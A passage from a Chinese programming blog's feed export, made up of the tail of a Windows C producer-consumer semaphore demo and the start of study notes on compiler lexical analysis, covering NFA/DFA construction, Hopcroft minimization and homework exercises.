class="line"></span><br><span class="line">Buffer shared_buffer = &#123; &#123;<span class="number">0</span>&#125;, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span> &#125;;</span><br><span class="line">HANDLE empty_semaphore;</span><br><span class="line">HANDLE full_semaphore;</span><br><span class="line">CRITICAL_SECTION mutex;         <span class="comment">// 临界区</span></span><br><span class="line"><span class="keyword">volatile</span> LONG running = TRUE;   <span class="comment">// 运行标志，控制线程的运行状态</span></span><br><span class="line">FILE* log_file;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置独立随机数种子</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">set_thread_random_seed</span><span class="params">(<span class="type">int</span> thread_id)</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> seed = (<span class="type">unsigned</span> <span class="type">int</span>)(<span class="built_in">time</span>(<span class="literal">NULL</span>) + thread_id);</span><br><span class="line">    <span class="built_in">srand</span>(seed);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 记录生产或消费操作</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">log_operation</span><span class="params">(<span class="type">int</span> id, <span class="type">int</span> item, <span class="type">char</span> type)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">EnterCriticalSection</span>(&amp;mutex);</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* operation = (type == <span class="string">&#x27;P&#x27;</span>) ? <span class="string">&quot;生产者&quot;</span> : <span class="string">&quot;消费者&quot;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s %d %s了数据: %d\n&quot;</span>, operation, id, (type == <span class="string">&#x27;P&#x27;</span>) ? <span class="string">&quot;生产&quot;</span> : <span class="string">&quot;消费&quot;</span>, item);</span><br><span class="line">    <span class="built_in">fprintf</span>(log_file, <span class="string">&quot;%s %d %s了数据: %d\n&quot;</span>, operation, id, (type == <span class="string">&#x27;P&#x27;</span>) ? <span class="string">&quot;生产&quot;</span> : <span class="string">&quot;消费&quot;</span>, item);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;缓冲区状态: &quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(log_file, <span class="string">&quot;缓冲区状态: &quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; BUFFER_SIZE; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%2d &quot;</span>, shared_buffer.buffer[i]);</span><br><span class="line">        <span class="built_in">fprintf</span>(log_file, <span class="string">&quot;%2d &quot;</span>, shared_buffer.buffer[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n入口指针: %d, 出口指针: %d, 当前使用量: %d/%d\n&quot;</span>,</span><br><span class="line">        shared_buffer.in, shared_buffer.out, shared_buffer.count, BUFFER_SIZE);</span><br><span class="line">    <span class="built_in">fprintf</span>(log_file, <span class="string">&quot;\n入口指针: %d, 出口指针: %d, 当前使用量: %d/%d\n&quot;</span>,</span><br><span class="line">        shared_buffer.in, shared_buffer.out, shared_buffer.count, BUFFER_SIZE);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;----------------------------------------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(log_file, <span class="string">&quot;----------------------------------------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">LeaveCriticalSection</span>(&amp;mutex);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 生产者线程函数</span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> __stdcall <span class="title">producer</span><span class="params">(<span class="type">void</span>* arg)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> id = *(<span class="type">int</span>*)arg;</span><br><span class="line">    <span class="built_in">set_thread_random_seed</span>(id);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">InterlockedCompareExchange</span>(&amp;running, TRUE, TRUE)) &#123;</span><br><span class="line">        <span class="type">int</span> item = <span class="built_in">rand</span>() % <span class="number">20</span> + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">WaitForSingleObject</span>(empty_semaphore, INFINITE);</span><br><span class="line">        <span class="built_in">EnterCriticalSection</span>(&amp;mutex);</span><br><span class="line"></span><br><span class="line">        shared_buffer.buffer[shared_buffer.in] = item;</span><br><span class="line">        shared_buffer.in = (shared_buffer.in + <span class="number">1</span>) % BUFFER_SIZE;</span><br><span class="line">        shared_buffer.count++;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">log_operation</span>(id, item, <span class="string">&#x27;P&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">LeaveCriticalSection</span>(&amp;mutex);</span><br><span class="line">        <span class="built_in">ReleaseSemaphore</span>(full_semaphore, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">Sleep</span>(<span class="built_in">rand</span>() % (MAX_SLEEP_TIME + <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 消费者线程函数</span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> __stdcall <span class="title">consumer</span><span class="params">(<span class="type">void</span>* arg)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> id = *(<span class="type">int</span>*)arg;</span><br><span class="line">    <span class="built_in">set_thread_random_seed</span>(id);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">InterlockedCompareExchange</span>(&amp;running, TRUE, TRUE)) &#123;</span><br><span class="line">        <span class="built_in">WaitForSingleObject</span>(full_semaphore, INFINITE);</span><br><span class="line">        <span class="built_in">EnterCriticalSection</span>(&amp;mutex);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> item = shared_buffer.buffer[shared_buffer.out];</span><br><span class="line">        shared_buffer.buffer[shared_buffer.out] = <span class="number">0</span>;</span><br><span class="line">        shared_buffer.out = (shared_buffer.out + <span class="number">1</span>) % BUFFER_SIZE;</span><br><span class="line">        shared_buffer.count--;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">log_operation</span>(id, item, <span class="string">&#x27;C&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">LeaveCriticalSection</span>(&amp;mutex);</span><br><span class="line">        <span class="built_in">ReleaseSemaphore</span>(empty_semaphore, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">Sleep</span>(<span class="built_in">rand</span>() % (MAX_SLEEP_TIME + <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建线程</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">create_threads</span><span class="params">(HANDLE* threads, <span class="type">int</span>* ids, <span class="type">unsigned</span>(__stdcall* func)(<span class="type">void</span>*), <span class="type">int</span> count)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; count; i++) &#123;</span><br><span class="line">        ids[i] = i + <span class="number">1</span>;</span><br><span class="line">        threads[i] = (HANDLE)_beginthreadex(<span class="literal">NULL</span>, <span class="number">0</span>, func, &amp;ids[i], <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 主循环：监听 ESC 键退出</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">wait_for_exit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">InterlockedCompareExchange</span>(&amp;running, TRUE, TRUE)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (_kbhit() &amp;&amp; _getch() == <span class="number">27</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;检测到 ESC 键，准备退出程序...\n&quot;</span>);</span><br><span class="line">            <span class="built_in">InterlockedExchange</span>(&amp;running, FALSE);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">Sleep</span>(<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通知所有线程退出</span></span><br><span class="line">    <span class="built_in">ReleaseSemaphore</span>(full_semaphore, CONSUMER_COUNT, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">ReleaseSemaphore</span>(empty_semaphore, PRODUCER_COUNT, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    log_file = <span class="built_in">fopen</span>(<span class="string">&quot;data.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (log_file == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;无法创建日志文件。\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    empty_semaphore = <span class="built_in">CreateSemaphore</span>(<span class="literal">NULL</span>, BUFFER_SIZE, BUFFER_SIZE, <span class="literal">NULL</span>);</span><br><span class="line">    full_semaphore = <span class="built_in">CreateSemaphore</span>(<span class="literal">NULL</span>, <span class="number">0</span>, BUFFER_SIZE, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">InitializeCriticalSection</span>(&amp;mutex);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(shared_buffer.buffer, <span class="number">0</span>, <span class="built_in">sizeof</span>(shared_buffer.buffer));</span><br><span class="line"></span><br><span class="line">    HANDLE producers[PRODUCER_COUNT];</span><br><span class="line">    HANDLE consumers[CONSUMER_COUNT];</span><br><span class="line">    <span class="type">int</span> producer_ids[PRODUCER_COUNT];</span><br><span class="line">    <span class="type">int</span> consumer_ids[CONSUMER_COUNT];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;按 ESC 键退出程序...\n&quot;</span>);</span><br><span class="line">    <span class="built_in">create_threads</span>(producers, producer_ids, producer, PRODUCER_COUNT);</span><br><span class="line">    <span class="built_in">create_threads</span>(consumers, consumer_ids, consumer, CONSUMER_COUNT);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">wait_for_exit</span>();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">WaitForMultipleObjects</span>(PRODUCER_COUNT, producers, TRUE, INFINITE);</span><br><span class="line">    <span class="built_in">WaitForMultipleObjects</span>(CONSUMER_COUNT, consumers, TRUE, INFINITE);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">DeleteCriticalSection</span>(&amp;mutex);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(empty_semaphore);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(full_semaphore);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PRODUCER_COUNT; i++) <span class="built_in">CloseHandle</span>(producers[i]);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; CONSUMER_COUNT; i++) <span class="built_in">CloseHandle</span>(consumers[i]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fclose</span>(log_file);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;程序已退出。\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>408</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
        <tag>C++</tag>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>编译原理</title>
    <url>/2024/11/21/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer">



<h2 id="编译器"><a href="#编译器" class="headerlink" title="编译器"></a>编译器</h2><p><strong>编译器</strong>是把源程序从一种表示变成另一种表示。</p>
<p>编译原理的四大部分：<u>前端</u>：<strong>词法分析</strong>、<strong>语法分析</strong>、<strong>语义分析</strong>；<u>后端</u>：<strong>代码生成</strong>。</p>
<p><strong>编译器</strong> 具有非常 <strong>模块化</strong>的高层结构</p>
<h2 id="词法分析"><a href="#词法分析" class="headerlink" title="词法分析"></a>词法分析</h2><p><strong>词法分析</strong>：检查字符流的单词合法性，生成记号流。【构成源程序的字符流，按照编程语言的词法规则将字符流组成词法记号流(token)】</p>
<p><strong>字符流：</strong>和被编译的语言密切相关</p>
<p><strong>记号流：</strong>编译器内部定义的数据结构，编码所识别出的词法单元。</p>
<p>词法分析器的实现方式：</p>
<ol>
<li>手工编码实现法<ul>
<li>先对复杂，容易出错</li>
<li>目前较为流行</li>
</ul>
</li>
<li>词法分析器的生成器<ul>
<li>可以快速原型，代码量较少</li>
<li>较难控制细节</li>
</ul>
</li>
</ol>
<h3 id="有限状态自动机："><a href="#有限状态自动机：" class="headerlink" title="有限状态自动机："></a><strong>有限状态自动机：</strong></h3><ol>
<li>确定状态有限状态自动机DFA<ul>
<li>对任意的字符，最多有一个状态可以转移</li>
</ul>
</li>
<li>非确定的有限状态自动机NFA<ul>
<li>对任意的字符，有多于一个状态可以转移</li>
</ul>
</li>
</ol>
<p><strong>自动生成的过程：</strong></p>
<p>正规表达式-(Thompson算法)–&gt;NFA-(子集构造法)–&gt;DFA-(Hopcroft 最小化算法)–&gt;词法分析器代码</p>
<h3 id="Thompson算法："><a href="#Thompson算法：" class="headerlink" title="Thompson算法："></a><strong>Thompson算法：</strong></h3><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/Thompson1.png" alt="Thompson1" style="zoom:72%;">

<img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/Thompson2.png" alt="Thompson2" style="zoom:67%;">

<h3 id="DFA的邻接矩阵表示法"><a href="#DFA的邻接矩阵表示法" class="headerlink" title="DFA的邻接矩阵表示法"></a><strong>DFA的邻接矩阵表示法</strong></h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/DFA%E7%9A%84%E4%B8%B4%E6%8E%A5%E7%9F%A9%E9%98%B5%E8%A1%A8%E7%A4%BA%E6%B3%95.png" alt="DFA的临接矩阵表示法"></p>
<table>
<thead>
<tr>
<th align="center">状态|字符</th>
<th>a</th>
<th>b</th>
</tr>
</thead>
<tbody><tr>
<td align="center">0</td>
<td>1</td>
<td>0</td>
</tr>
<tr>
<td align="center">1</td>
<td>2</td>
<td>1</td>
</tr>
<tr>
<td align="center">2</td>
<td>2</td>
<td>2</td>
</tr>
</tbody></table>
<p><strong>a(b|c)^*^    NFA</strong></p>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/nfa.png" alt="a(b|c)\*"></p>
<h3 id="子集构造法："><a href="#子集构造法：" class="headerlink" title="子集构造法："></a><strong>子集构造法：</strong></h3><p>q0={n0}</p>
<p>q0-a-&gt;{n1,n2,n3,n4,n6,n9}=q1</p>
<p>q1-b-&gt;{n4,n5,n8,n9,n3,n6}=q2</p>
<p>q1-c-&gt;{n6,n7,n8,n9,n3,n4}=q3</p>
<p>q2-b-&gt;{n4,n5,n8,n9,n3,n6}=q2</p>
<p>q2-c-&gt;{n6,n7,n8.n9,n3,n4}=q3</p>
<p>q3-b-&gt;{n4,n5,n8,n9,n3,n6}=q2</p>
<p>q3-c-&gt;{n6,n7,n8,n9,n3,n4}=q3</p>
<p><strong>a(b|c)^*^    DFA</strong></p>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/DFA.png" alt="a(b|c)\*"></p>
<table>
<thead>
<tr>
<th align="center">状态|字符</th>
<th>a</th>
<th>b</th>
<th>c</th>
</tr>
</thead>
<tbody><tr>
<td align="center">q0</td>
<td>q1</td>
<td>\</td>
<td>\</td>
</tr>
<tr>
<td align="center">q1</td>
<td>\</td>
<td>q2</td>
<td>q3</td>
</tr>
<tr>
<td align="center">q2</td>
<td>\</td>
<td>q2</td>
<td>q3</td>
</tr>
<tr>
<td align="center">q3</td>
<td>\</td>
<td>q2</td>
<td>q3</td>
</tr>
</tbody></table>
<h3 id="Hopcroft-算法："><a href="#Hopcroft-算法：" class="headerlink" title="Hopcroft 算法："></a><strong>Hopcroft 算法：</strong></h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">//基于等价类的思想</span><br><span class="line">split(S)</span><br><span class="line">    foreach(character c)</span><br><span class="line">        if(c can split s)</span><br><span class="line">            split s into T1, ..., Tk</span><br><span class="line"></span><br><span class="line">hopcroft()</span><br><span class="line">    split all nodes into N, A</span><br><span class="line">    while(set is still changes)</span><br><span class="line">        split(s)</span><br></pre></td></tr></table></figure></div>

<p>Hopsroft 算法就是先根据非终结状态与非终结状态将所有的节点分为 N 和 A 两大类。 N 为非终结状态，A 为终结状态，之后再对每一组运用基于等价类实现的切割算法。</p>
<p>切分为 N 和 A, N 是 q0, A 是 {q1, q2, q3}；在 A 中，就字符 b 的状态转移，每个节点最后得到的都还是 A 这个状态，无法对 q1, q2, q3 进行区分。同理，c 也不能这三个节点进行切分。所以就将这三个节点融合为一个新的节点 q4。</p>
<img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/最简DFA.png" alt="最简DFA.png" style="zoom:150%;">

<p>状态跳转表</p>
<table>
<thead>
<tr>
<th align="center">状态\字符</th>
<th align="center">a</th>
<th align="center">b</th>
<th align="center">c</th>
</tr>
</thead>
<tbody><tr>
<td align="center">q0</td>
<td align="center">q4</td>
<td align="center">\</td>
<td align="center">\</td>
</tr>
<tr>
<td align="center">q4</td>
<td align="center">\</td>
<td align="center">q4</td>
<td align="center">q4</td>
</tr>
</tbody></table>
<h3 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h3><p><strong>作业2.2：</strong>在下面的C函数钟，按序列出所有的记号，并给每个记号以合理的属性值</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">gcd</span><span class="params">(<span class="type">long</span> p <span class="type">long</span> q)</span>{</span><br><span class="line">     <span class="keyword">if</span> (p%q==<span class="number">0</span>)</span><br><span class="line">     	<span class="comment">/*then part*/</span></span><br><span class="line">     	<span class="keyword">return</span> q;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">        <span class="comment">/*else part*/</span></span><br><span class="line">        <span class="keyword">return</span> gcd(q,p%q);</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>一共有33组记号</p>
<p>关键字：long 、 if 、 else 、 return</p>
<p>运算符：% 、 == 、 0</p>
<p>标识符：gcd 、p 、q</p>
<p>界限符：，、{、}、(、)</p>
</blockquote>
<p><strong>作业2.3</strong>：叙述下列正规式描述的语言</p>
<p>(a) <mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="7.902ex" height="2.262ex" role="img" focusable="false" viewbox="0 -750 3492.6 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mn"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"/></g><g data-mml-node="mo" transform="translate(500,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/></g><g data-mml-node="mn" transform="translate(889,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"/></g><g data-mml-node="mo" transform="translate(1389,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"/></g><g data-mml-node="mn" transform="translate(1667,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/></g><g data-mml-node="msup" transform="translate(2167,0)"><g data-mml-node="mo"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/></g><g data-mml-node="mo" transform="translate(422,413) scale(0.707)"><path data-c="2217" d="M229 286Q216 420 216 436Q216 454 240 464Q241 464 245 464T251 465Q263 464 273 456T283 436Q283 419 277 356T270 286L328 328Q384 369 389 372T399 375Q412 375 423 365T435 338Q435 325 425 315Q420 312 357 282T289 250L355 219L425 184Q434 175 434 161Q434 146 425 136T401 125Q393 125 383 131T328 171L270 213Q283 79 283 63Q283 53 276 44T250 35Q231 35 224 44T216 63Q216 80 222 143T229 213L171 171Q115 130 110 127Q106 124 100 124Q87 124 76 134T64 161Q64 166 64 169T67 175T72 181T81 188T94 195T113 204T138 215T170 230T210 250L74 315Q65 324 65 338Q65 353 74 363T98 374Q106 374 116 368T171 328L229 286Z"/></g></g><g data-mml-node="mn" transform="translate(2992.6,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"/></g></g></g></svg></mjx-container></p>
<blockquote>
<p>以0开头和结尾的由0和1组成的串</p>
</blockquote>
<p>(b)<mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="9.306ex" height="2.262ex" role="img" focusable="false" viewbox="0 -750 4113.1 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/></g><g data-mml-node="mo" transform="translate(389,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/></g><g data-mml-node="mi" transform="translate(778,0)"><path data-c="1D716" d="M227 -11Q149 -11 95 41T40 174Q40 262 87 322Q121 367 173 396T287 430Q289 431 329 431H367Q382 426 382 411Q382 385 341 385H325H312Q191 385 154 277L150 265H327Q340 256 340 246Q340 228 320 219H138V217Q128 187 128 143Q128 77 160 52T231 26Q258 26 284 36T326 57T343 68Q350 68 354 58T358 39Q358 36 357 35Q354 31 337 21T289 0T227 -11Z"/></g><g data-mml-node="mo" transform="translate(1184,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"/></g><g data-mml-node="mn" transform="translate(1462,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"/></g><g data-mml-node="mo" transform="translate(1962,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/></g><g data-mml-node="msup" transform="translate(2351,0)"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/></g><g data-mml-node="mo" transform="translate(533,413) scale(0.707)"><path data-c="2217" d="M229 286Q216 420 216 436Q216 454 240 464Q241 464 245 464T251 465Q263 464 273 456T283 436Q283 419 277 356T270 286L328 328Q384 369 389 372T399 375Q412 375 423 365T435 338Q435 325 425 315Q420 312 357 282T289 250L355 219L425 184Q434 175 434 161Q434 146 425 136T401 125Q393 125 383 131T328 171L270 213Q283 79 283 63Q283 53 276 44T250 35Q231 35 224 44T216 63Q216 80 222 143T229 213L171 171Q115 130 110 127Q106 124 100 124Q87 124 76 134T64 161Q64 166 64 169T67 175T72 181T81 188T94 195T113 204T138 215T170 230T210 250L74 315Q65 324 65 338Q65 353 74 363T98 374Q106 374 116 368T171 328L229 286Z"/></g></g><g data-mml-node="msup" transform="translate(3287.6,0)"><g data-mml-node="mo"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/></g><g data-mml-node="mo" transform="translate(422,413) scale(0.707)"><path data-c="2217" d="M229 286Q216 420 216 436Q216 454 240 464Q241 464 245 464T251 465Q263 464 273 456T283 436Q283 419 277 356T270 286L328 328Q384 369 389 372T399 375Q412 375 423 365T435 338Q435 325 425 315Q420 312 357 282T289 250L355 219L425 184Q434 175 434 161Q434 146 425 136T401 125Q393 125 383 131T328 171L270 213Q283 79 283 63Q283 53 276 44T250 35Q231 35 224 44T216 63Q216 80 222 143T229 213L171 171Q115 130 110 127Q106 124 100 124Q87 124 76 134T64 161Q64 166 64 169T67 175T72 181T81 188T94 195T113 204T138 215T170 230T210 250L74 315Q65 324 65 338Q65 353 74 363T98 374Q106 374 116 368T171 328L229 286Z"/></g></g></g></g></svg></mjx-container></p>
<blockquote>
<p>包含空串的由0和1组成的串</p>
</blockquote>
<p>(c)<mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="16.074ex" height="2.262ex" role="img" focusable="false" viewbox="0 -750 7104.6 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"/></g><g data-mml-node="mo" transform="translate(889,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"/></g><g data-mml-node="mn" transform="translate(1167,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 